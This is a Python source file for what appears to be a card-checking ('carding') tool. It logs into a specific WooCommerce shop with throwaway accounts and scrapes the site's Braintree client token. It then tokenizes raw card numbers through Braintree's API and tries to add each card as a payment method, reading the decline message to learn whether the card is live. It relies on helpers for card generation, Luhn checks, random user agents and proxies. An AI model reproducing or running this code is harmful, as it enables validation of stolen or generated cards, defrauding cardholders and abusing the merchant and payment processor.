


import json


import base64

from app.core.reqPlus import reqPlus




from app.utils.exceptions import(
    expInvalidRequest,
    expInvalidRequestsResponse,
    invalidCredentials,
    userNotFound,
    captchaWrong,
    expMaxRetries,
    expSpecialTimeOut
)

import urllib


from app.utils.cchelper import(
    formatar_cc,
    fmt_cc,
    luhn,
    gen_gg
)

from app.utils.utils import(
    add_arquivo,
    gibe_random_ua,
    b64decfixpad
)



import json

from app.utils.fakeUSAperson import FakePesonCheckoutAluvii


from app.utils.utils import load_json_file

import random



PATH_RESPONSE_CODES = 'app/files/braintreewp-response-codes.json'


status_response_codes = load_json_file(PATH_RESPONSE_CODES)


def get_status(status):
    return status_response_codes.get(status, '')





def rnd_login():
    logins = [
        'vtcwxhzjuczu@wireconnected.com',
        'vtcwxhzjuczu1@wireconnected.com',
        'vtcwxhzjuczu2@wireconnected.com'
    ]
    return random.choice(logins)



status_str_maios2 = {'Do Not Honor': '2000', 'Insufficient Funds': '2001', 'Limit Exceeded': '2002', "Cardholder's Activity Limit Exceeded": '2003', 'Expired Card': '2004', 'Invalid Credit Card Number': '2005', 'Invalid Expiration Date': '2006', 'No Account': '2007', 'Card Account Length Error': '2008', 'No Such Issuer': '2009', 'Card Issuer Declined CVV': '2010', 'Voice Authorization Required': '2011', 'Processor Declined - Possible Lost Card': '2012', 'Processor Declined - Possible Stolen Card': '2013', 'Processor Declined - Fraud Suspected': '2014', 'Transaction Not Allowed': '2015', 'Duplicate Transaction': '2016', 'Cardholder Stopped Billing': '2017', 'Cardholder Stopped All Billing': '2018', 'Invalid Transaction': '2019', 'Violation': '2020', 'Security Violation': '2021', 'Declined - Updated Cardholder Available': '2022', 'Processor Does Not Support This Feature': '2023', 'Card Type Not Enabled': '2024', 'Set Up Error - Merchant': '2025', 'Invalid Merchant ID': '2026', 'Set Up Error - Amount': '2027', 'Set Up Error - Hierarchy': '2028', 'Set Up Error - Card': '2029', 'Set Up Error - Terminal': '2030', 'Encryption Error': '2031', 'Surcharge Not Permitted': '2032', 'Inconsistent Data': '2033', 'No Action Taken': '2034', 'Partial Approval For Amount In Group III Version': '2035', 'Authorization could not be found': '2036', 'Already Reversed': '2037', 'Processor Declined': '2109-2999', 'Invalid Authorization Code': '2039', 'Invalid Store': '2040', 'Declined - Call For Approval': '2041', 'Invalid Client ID': '2042', 'Error - Do Not Retry, Call Issuer': '2043', 'Declined - Call Issuer': '2044', 'Invalid Merchant Number': '2045', 'Declined': '2046', 'Call Issuer. Pick Up Card': '2047', 'Invalid Amount': '2048', 'Invalid SKU Number': '2049', 'Invalid Credit Plan': '2050', 'Credit Card Number does not match method of payment': '2051', 'Invalid level III Purchase': '2052', 'Card reported as lost or stolen': '2053', 'Reversal amount does not match authorization amount': '2054', 'Invalid Transaction Division Number': '2055', 'Transaction amount exceeds the transaction division limit': '2056', 'Issuer or Cardholder has put a restriction on the card': '2057', 'Merchant not Mastercard SecureCode enabled': '2058', 'Address Verification Failed': '2059', 'Address Verification and Card Security Code Failed': '2060', 'Invalid Transaction Data': '2061', 'Invalid Tax Amount': '2062', 'PayPal Business Account preference resulted in the\ntransaction failing': '2063', 'Invalid Currency Code': '2064', 'Refund Time Limit Exceeded': '2065', 'PayPal Business Account Restricted': '2066', 'Authorization Expired': '2067', 'PayPal Business Account Locked or Closed': '2068', 'PayPal Blocking Duplicate Order IDs': '2069', 'PayPal Buyer Revoked Pre-Approved Payment Authorization': '2070', 'PayPal Payee Account Invalid Or Does Not Have a Confirmed\nEmail': '2071', 'PayPal Payee Email Incorrectly Formatted': '2072', 'PayPal Validation Error': '2073', "Funding Instrument In The PayPal Account Was Declined By The\nProcessor Or Bank, Or It Can't Be Used For This Payment": '2074', 'Payer Account Is Locked Or Closed': '2075', 'Payer Cannot Pay For This Transaction With PayPal': '2076', 'Transaction Refused Due To PayPal Risk Model': '2077', 'Invalid Secure Payment Data': '2078', 'PayPal Merchant Account Configuration Error': '2079', 'Invalid user credentials': '2080', 'PayPal pending payments are not supported': '2081', 'PayPal Domestic Transaction Required': '2082', 'PayPal Phone Number Required': '2083', 'PayPal Tax Info Required': '2084', 'PayPal Payee Blocked Transaction': '2085', 'PayPal Transaction Limit Exceeded': '2086', 'PayPal reference transactions not enabled for your account': '2087', 'Currency not enabled for your PayPal seller account': '2088', 'PayPal payee email permission denied for this request': '2089', 'PayPal or Venmo account not configured to refund more than\nsettled amount': '2090', 'Currency of this transaction must match currency of your\nPayPal account': '2091', 'No Data Found - Try Another Verification Method': '2092', 'PayPal payment method is invalid': '2093', 'PayPal payment has already been completed': '2094', 'PayPal refund is not allowed after partial refund': '2095', "PayPal buyer account can't be the same as the seller account": '2096', 'PayPal authorization amount limit exceeded': '2097', 'PayPal authorization count limit exceeded': '2098', 'Cardholder Authentication Required': '2099', 'PayPal channel initiated billing not enabled for your\naccount': '2100', 'Additional authorization required': '2101', 'Incorrect PIN': '2102', 'PIN try exceeded': '2103', 'Offline Issuer Declined': '2104', 'Cannot Authorize at this time (Life cycle)': '2105', 'Cannot Authorize at this time (Policy)': '2106', 'Card Not Activated': '2107', 'Closed Card': '2108', 'Processor Network Unavailable - Try Again': '3000'}



class maiomenos(reqPlus):
    def __init__(self, proxies={}, timeout=(10,30)):
        self._user_random = rnd_login()
        self.username = self._user_random
        self.password = self._user_random
        self._user_status = False
        self._braintree_token = False
        self._braintree_config_json = {}
        self._nonce_pay = '563543cae9'
        super().__init__(proxies=proxies, timeout=timeout, default_useragent=gibe_random_ua())
    def check(self, raw_cc):
        if not self._user_status:
            if not self.make_login():
                print(f'failed make login')
                return False
            if not self.get_braintree_token():
                print(f'failed get_braintree_token')
                return False
        return self.try_cc(raw_cc)
    def make_login(self, _nonce_login=None):
        url = 'https://maisonnumen.com/my-account/edit-account/'
        headers = self._gen_headers()
        if not _nonce_login:
            self._new_session()
            _method_use = 'GET'
            payload = None
        else:
            _method_use = 'POST'
            payload = {
                "username": self.username,
                "password": self.password,
                "_wp_http_referer": '/my-account/edit-account',
                '_wpnonce': _nonce_login,
                'login': 'Log in'
            }
        try:
            temp = self._make_call(
                url=url,
                headers=headers,
                method=_method_use,
                data=payload,
                _allow_redirect=True,
                _auto_retry=False,
                _auto_retry_max=5,
                _auto_retry_status_code=[
                    429,
                ],
            )
        except expMaxRetries as err_too_many_tries:
            raise expMaxRetries()
        except expInvalidRequestsResponse as err_response:
            print(f'expInvalidRequestsResponse -- {err_response}')
        except expInvalidRequest as err_request:
            print(f'expInvalidRequest -- {err_request}')
        except Exception as err:
            print(f'make_login exp - {err}')
        else:
            if temp.status_code == 200:
                if not _nonce_login:
                    xbody = temp.xtext()
                    if xbody:
                        xelem = xbody.xpath('//input[@id="_wpnonce"]')
                        if xelem:
                            elem = xelem[0]
                            nonce_use_again = elem.attrib.get('value', False)
                            if nonce_use_again:
                                return self.make_login(_nonce_login=nonce_use_again)
                else:
                    if temp.response.history:
                        if temp.response.url.endswith('/'):
                            self._user_status = True
                            return True
        return False
    def get_braintree_token(self):
        if not self._user_status:
            return False
        url = 'https://maisonnumen.com/my-account/add-payment-method/'
        headers = self._gen_headers()
        try:
            temp = self._make_call(
                url=url,
                headers=headers,
                method='GET',
                _allow_redirect=True,
                _auto_retry=False,
                _auto_retry_max=5,
                _auto_retry_status_code=[
                    429,
                ],
            )
        except expMaxRetries as err_too_many_tries:
            raise expMaxRetries()
        except expInvalidRequestsResponse as err_response:
            print(f'expInvalidRequestsResponse -- {err_response}')
        except expInvalidRequest as err_request:
            print(f'expInvalidRequest -- {err_request}')
        except Exception as err:
            print(f'get_braintree_token exp - {err}')
        else:
            if temp.status_code == 200:
                h_s1 = self.username
                if h_s1 in temp.text():
                    xbody = temp.xtext()
                    if xbody:
                        xelem = xbody.xpath('//script[@id="wc-braintree-client-manager-js-extra"]')
                        if xelem:
                            elem = xelem[0]
                            temp_scrap = elem.text_content().strip()
                            h_s2 = 'var wc_braintree_client_token = ["'
                            if h_s2 in temp_scrap:
                                temp_token = temp_scrap[temp_scrap.index(h_s2)+len(h_s2):]
                                temp_token = temp_token[0:temp_token.index('"')]
                                try:
                                    temp_b64d = base64.b64decode(temp_token.encode())
                                except Exception as err_b64:
                                    print(f'coloursComplementsCC.get_braintree_token - b64 decode exp - {err_b64}')
                                else:
                                    temp_jdata = json.loads(temp_b64d.decode())
                                    braintree_token = temp_jdata.get('authorizationFingerprint', False)
                                    if braintree_token:
                                        self._braintree_token = braintree_token
                                        self._braintree_config_json = temp_jdata
                                        return True
        return False
    def _gen_braintree_card_token(self, raw_cc):
        if not self._braintree_token or not self._braintree_config_json:
            return False
        temp_cc_data = formatar_cc(raw_cc)
        if not temp_cc_data:
            return False
        url = 'https://payments.braintree-api.com/graphql'
        headers = self._gen_headers(
            bearer=self._braintree_token,
            **{
                'Braintree-Version': '2018-05-10'
            }
        )
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "db5c9b91-963d-4d6a-ae62-51653014e41f"
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": temp_cc_data.get('cc'),
                        "expirationMonth": temp_cc_data.get('month'),
                        "expirationYear": temp_cc_data.get('year'),
                        "cvv": temp_cc_data.get('cvv'),
                        "billingAddress": {
                            "postalCode": "13088-550",
                            "streetAddress": "rua eucalipto"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        try:
            temp = self._make_call(
                url=url,
                headers=headers,
                method='POST',
                json=payload,
                _auto_retry=True,
                _auto_retry_max=5,
                _auto_retry_status_code=[
                    429,
                ],
            )
        except expMaxRetries as err_too_many_tries:
            raise expMaxRetries()
        except expInvalidRequestsResponse as err_response:
            print(f'expInvalidRequestsResponse -- {err_response}')
        except expInvalidRequest as err_request:
            print(f'expInvalidRequest -- {err_request}')
        except Exception as err:
            print(f'_gen_braintree_card_token exp - {err}')
        else:
            if temp.status_code == 200:
                temp_card_token = temp.json().get('data', {}).get('tokenizeCreditCard', {}).get('token', False)
                if temp_card_token:
                    return temp_card_token
        return False
    def try_cc(self, raw_cc, new_nonce=False, old_token=None):
        if not new_nonce and not old_token:
            token_cc = self._gen_braintree_card_token(raw_cc=raw_cc)
            if not token_cc:
                return False
        else:
            self._nonce_pay = new_nonce
            token_cc = old_token
        pay_nonce = self._nonce_pay
        url = 'https://maisonnumen.com/my-account/add-payment-method/'
        headers = self._gen_headers(
            referer='https://maisonnumen.com/my-account/add-payment-method',
            origin='https://maisonnumen.com'
        )
        payload = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token_cc,
            'braintree_cc_device_data': '',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': json.dumps(self._braintree_config_json, separators=(',', ':')),
            'woocommerce-add-payment-method-nonce': pay_nonce,
            '_wpnonce': pay_nonce,
            '_wp_http_referer': '/my-account/add-payment-method',
            'woocommerce_add_payment_method': '1',
        }
        try:
            temp = self._make_call(
                url=url,
                headers=headers,
                method='POST',
                data=payload,
                _auto_retry=False,
                _auto_retry_max=5,
                _auto_retry_status_code=[
                    429,
                ],
            )
        except expMaxRetries as err_too_many_tries:
            raise expMaxRetries()
        except expInvalidRequestsResponse as err_response:
            print(f'expInvalidRequestsResponse -- {err_response}')
        except expInvalidRequest as err_request:
            print(f'expInvalidRequest -- {err_request}')
        except Exception as err:
            print(f'try_cc exp - {err}')
        else:
            api_response = {
                'response_raw': None,
                'auth_response': -1,
                'response': None,
                'currency': 'USD',
                'amount': '0.00'
            }
            if temp.status_code in (302, 200):
                if temp.status_code == 302:
                    api_response.update({'auth_response': '1000'})
                    return api_response
                else:
                    xbody = temp.xtext()
                    if xbody:
                        xelem = xbody.xpath('//ul[@class="woocommerce-error"]')
                        if xelem:
                            elem = xelem[0]
                            print(elem.text_content())
                            resp_back = elem.text_content().strip()
                            api_response.update({'response_raw': resp_back})
                            hs1 = 'Reason: '
                            if hs1 in resp_back:
                                resp_back = resp_back[resp_back.index(hs1)+len(hs1):].strip()
                                api_response.update({'response': resp_back})
                                resp_status = get_status(status=resp_back)
                                if resp_status:
                                    api_response.update(
                                        {
                                            'auth_response': resp_status,
                                            'response': resp_back
                                        }
                                    )
                            return api_response
                        else:
                            xelem = xbody.xpath('//input[@id="_wpnonce"]')
                            if xelem:
                                elem = xelem[0]
                                nonce_use_again = elem.attrib.get('value', False)
                                if nonce_use_again:
                                    return self.try_cc(raw_cc=raw_cc, new_nonce=nonce_use_again, old_token=token_cc)
        return False


